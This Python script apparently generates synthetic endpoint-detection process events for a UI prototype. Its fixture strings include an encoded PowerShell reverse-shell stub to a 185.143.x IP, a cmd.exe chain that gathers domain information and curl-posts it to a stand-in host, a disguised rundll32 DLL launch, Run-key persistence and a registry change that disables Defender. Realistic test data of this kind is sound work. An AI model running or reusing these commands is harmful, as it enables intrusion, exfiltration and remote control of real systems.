"""PROTOTYPE (#170, throwaway): writes actions/row-detail.yaml, process events with ~45 fields.

Run: python3 makeRows.py. The rows are fixed (seeded), so the ids match seed.sh's annotations.
"""

import json
import random
from pathlib import Path

random.seed(170)
HOSTS = ["WS-FIN-0142", "WS-ENG-0031", "SRV-SQL-07", "LT-HR-0555", "DC-02"]
USERS = ["j.moreno", "a.okafor", "svc_backup", "k.lindqvist", "SYSTEM"]
B64 = (
    "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBj"
    "AGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA4ADUALgAxADQAMwAuADIAMgAzAC4AMQA5ACIALAA0ADQA"
    "MwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBi"
    "AHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUA"
    "KAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0"
)
JARS = [
    "commons-lang3-3.14.0", "commons-io-2.16.1", "jackson-databind-2.17.2", "jackson-core-2.17.2",
    "log4j-core-2.23.1", "log4j-api-2.23.1", "guava-33.2.1-jre", "postgresql-42.7.3",
    "HikariCP-5.1.0", "netty-all-4.1.112.Final", "reporting-core-8.4.2",
]
COMMANDS = [
    (
        "powershell.exe",
        '"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" -NoProfile -NonInteractive '
        f"-WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand {B64}",
    ),
    (
        "cmd.exe",
        'cmd.exe /c "whoami /all > %TEMP%\\w.txt && net group "Domain Admins" /domain >> %TEMP%\\w.txt '
        "&& nltest /dclist:corp.example.com >> %TEMP%\\w.txt && certutil -encode %TEMP%\\w.txt "
        '%TEMP%\\w.b64 && curl -s -X POST --data-binary @%TEMP%\\w.b64 https://cdn-sync.example.net/u"',
    ),
    (
        "rundll32.exe",
        '"C:\\Windows\\System32\\rundll32.exe" "C:\\Users\\j.moreno\\AppData\\Local\\Microsoft\\Windows\\'
        'INetCache\\IE\\8F2K1QZ0\\invoice_2026_10_Q3_final_signed[1].dll",DllRegisterServer '
        "-k netsvcs -p -s Schedule",
    ),
    (
        "java.exe",
        '"C:\\Program Files\\Eclipse Adoptium\\jdk-21.0.4.7-hotspot\\bin\\java.exe" -Xms512m -Xmx4g '
        "-XX:+UseG1GC -Dlog4j2.formatMsgNoLookups=true -Dfile.encoding=UTF-8 -cp "
        + ";".join(f"C:\\apps\\reporting\\lib\\{n}.jar" for n in JARS)
        + " com.example.reporting.Main --config C:\\apps\\reporting\\conf\\prod.yaml --nightly",
    ),
    ("svchost.exe", "C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule"),
    (
        "msiexec.exe",
        'msiexec.exe /i "https://updates.example-cdn.net/agent/AgentSetup-x64-7.12.0.msi" /qn '
        "ALLUSERS=1 REBOOT=ReallySuppress TOKEN=eyJhbGciOiJIUzI1NiJ9.eyJ0ZW5hbnQiOiJmaW4ifQ.c2lnbmF0dXJl "
        "/L*V C:\\Windows\\Temp\\agent-install.log",
    ),
]
PARENTS = [
    (
        "WINWORD.EXE",
        '"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" /n '
        '"C:\\Users\\j.moreno\\Downloads\\Invoice_Q3_2026 (2).docm" /o ""',
    ),
    ("explorer.exe", "C:\\Windows\\Explorer.EXE"),
    ("services.exe", "C:\\Windows\\system32\\services.exe"),
    ("wmiprvse.exe", "C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding"),
]


def hexs(n: int) -> str:
    return "".join(random.choice("0123456789abcdef") for _ in range(n))


def folder(command: str) -> str:
    return command.split('"')[1] if command.startswith('"') else command.split(" ")[0]


def evidence(n: int, host: str, user: str, cmd: str) -> dict:
    """A large nested object, as an XDR alert's evidence: own random, so the other fields stay put."""
    r = random.Random(n)
    hx = lambda k: "".join(r.choice("0123456789abcdef") for _ in range(k))  # noqa: E731
    chain = ["explorer.exe", "WINWORD.EXE", "cmd.exe", "powershell.exe"]
    return {
        "alertId": f"da{hx(16)}_{r.randint(10**8, 10**9)}",
        "severity": r.choice(["High", "Medium"]),
        "detectionSource": "EndpointDetectionAndResponse",
        "mitre": {"tactics": ["Execution", "DefenseEvasion", "CommandAndControl"], "techniques": ["T1059.001", "T1027", "T1071.001"]},
        "device": {"name": host, "os": {"platform": "Windows11", "build": 22631, "patched": False}, "riskScore": r.choice(["High", "Medium"]), "tags": ["finance", "vip"]},
        "processTree": [
            {
                "depth": i,
                "image": name,
                "pid": r.randint(1000, 65000),
                "user": f"CORP\\{user}",
                "sha256": hx(64),
                "signed": name != "powershell.exe" or i < 3,
                "commandLine": cmd if i == len(chain) - 1 else f"C:\\Windows\\{name}",
            }
            for i, name in enumerate(chain)
        ],
        "network": [
            {"remoteIp": f"185.143.223.{r.randint(1, 254)}", "remotePort": 443, "protocol": "Tcp", "bytesSent": r.randint(1000, 90000), "bytesReceived": r.randint(1000, 900000), "sni": "cdn-sync.example.net"}
            for _ in range(3)
        ],
        "registry": [
            {"key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "value": "OneDriveSync", "data": "powershell -w hidden -enc " + hx(24)},
            {"key": "HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinDefend", "value": "Start", "data": 4},
        ],
        "files": [{"path": f"C:\\Users\\{user}\\AppData\\Local\\Temp\\{hx(8)}.ps1", "size": r.randint(800, 9000), "sha256": hx(64)} for _ in range(2)],
        "verdict": None,
        "comments": [],
    }


rows = []
for n in range(1, 61):
    exe, cmd = random.choice(COMMANDS)
    pexe, pcmd = random.choice(PARENTS)
    host = random.choice(HOSTS)
    user = random.choice(USERS)
    networked = n % 3 == 0
    row = {
        "TimeGenerated": f"2026-10-2{n % 7}T{n % 24:02d}:{(n * 7) % 60:02d}:{(n * 13) % 60:02d}.{n * 37 % 1000:03d}Z",
        "EventId": f"evt-{n:04d}",
        "DeviceName": f"{host.lower()}.corp.example.com",
        "DeviceId": hexs(40),
        "OSPlatform": "Windows11" if host.startswith(("WS", "LT")) else "WindowsServer2022",
        "OSVersion": "10.0.22631.4317",
        "ActionType": random.choice(["ProcessCreated", "ProcessCreated", "ConnectionSuccess", "ImageLoaded"]),
        "FileName": exe,
        "FolderPath": "C:\\Windows\\System32\\" + exe,
        "ProcessCommandLine": cmd,
        "ProcessId": random.randint(1000, 65000),
        "ProcessCreationTime": f"2026-10-21T{n % 24:02d}:{(n * 7) % 60:02d}:00Z",
        "ProcessIntegrityLevel": random.choice(["High", "Medium", "System"]),
        "ProcessTokenElevation": random.choice(["TokenElevationTypeFull", "TokenElevationTypeDefault"]),
        "IsElevated": random.choice([True, False]),
        "SHA256": hexs(64),
        "SHA1": hexs(40),
        "MD5": hexs(32),
        "FileSize": random.randint(10_000, 90_000_000),
        "AccountDomain": "CORP",
        "AccountName": user,
        "AccountSid": f"S-1-5-21-{random.randint(10**9, 4 * 10**9)}-{random.randint(10**9, 4 * 10**9)}-{random.randint(1000, 9999)}",
        "AccountUpn": "" if user in ("SYSTEM", "svc_backup") else f"{user}@corp.example.com",
        "LogonId": random.randint(100000, 999999),
        "InitiatingProcessFileName": pexe,
        "InitiatingProcessFolderPath": folder(pcmd),
        "InitiatingProcessCommandLine": pcmd,
        "InitiatingProcessId": random.randint(1000, 65000),
        "InitiatingProcessParentFileName": random.choice(["explorer.exe", "userinit.exe", "svchost.exe"]),
        "InitiatingProcessParentId": random.randint(400, 9000),
        "InitiatingProcessSHA256": hexs(64),
        "InitiatingProcessAccountName": user,
        "InitiatingProcessSignatureStatus": random.choice(["Valid", "Valid", "Unsigned"]),
        "InitiatingProcessSignerType": random.choice(["OsVendor", "ThirdParty", ""]),
        "RemoteIP": f"185.143.{random.randint(0, 255)}.{random.randint(1, 254)}" if networked else "",
        "RemotePort": 443 if networked else None,
        "RemoteUrl": (
            "https://cdn-sync.example.net/api/v2/telemetry/upload?session=" + hexs(48)
            + "&client=winhttp&build=19045&lang=en-GB&retry=3&sig=" + hexs(64)
        )
        if networked
        else "",
        "LocalIP": f"10.20.{n % 8}.{(n * 11) % 250 + 2}",
        "Protocol": "Tcp" if networked else "",
        "ReportId": random.randint(10_000, 99_999),
        "MitreTechniques": random.choice(
            [["T1059.001", "T1027"], ["T1218.011"], ["T1033", "T1087.002", "T1567"], []]
        ),
        "AdditionalFields": {
            "ProcessStartKey": random.randint(10**15, 10**16),
            "CommandLineLength": len(cmd),
            "Detection": {"engine": "1.1.24090.11", "rules": ["SuspEncodedPs", "LolbinNetwork"][: n % 3]},
        },
        "Notes": (
            "Seen first on the finance laptop.\nSame hash on 3 other hosts; see the parent chain.\n"
            "Asked the service desk whether the agent install was planned."
        )
        if n % 5 == 0
        else "",
        "Score": round(random.random() * 100, 2),
        "Blob": hexs(400) if n % 4 == 0 else "",
    }
    if n % 4 == 1:  # evt-0001, evt-0005, ...: a large object
        row["AlertEvidence"] = evidence(n, host, user, cmd)
    if n % 9 == 0:
        del row["EventId"]  # a row without an id
    rows.append(row)

HEAD = """\
# PROTOTYPE (#170, throwaway): written by makeRows.py. Process events for the Row detail prototype.
type: dev_rows
key: prototype-row-detail
name: Process events (prototype)
menu: Prototype
description: 60 process events with ~45 fields; every 9th has no id
pivot: none
id: EventId
rows:
"""
out = Path(__file__).parent / "actions" / "row-detail.yaml"
out.parent.mkdir(exist_ok=True)
out.write_text(HEAD + "".join(f"  - {json.dumps(r)}\n" for r in rows))
print(f"wrote {out}")
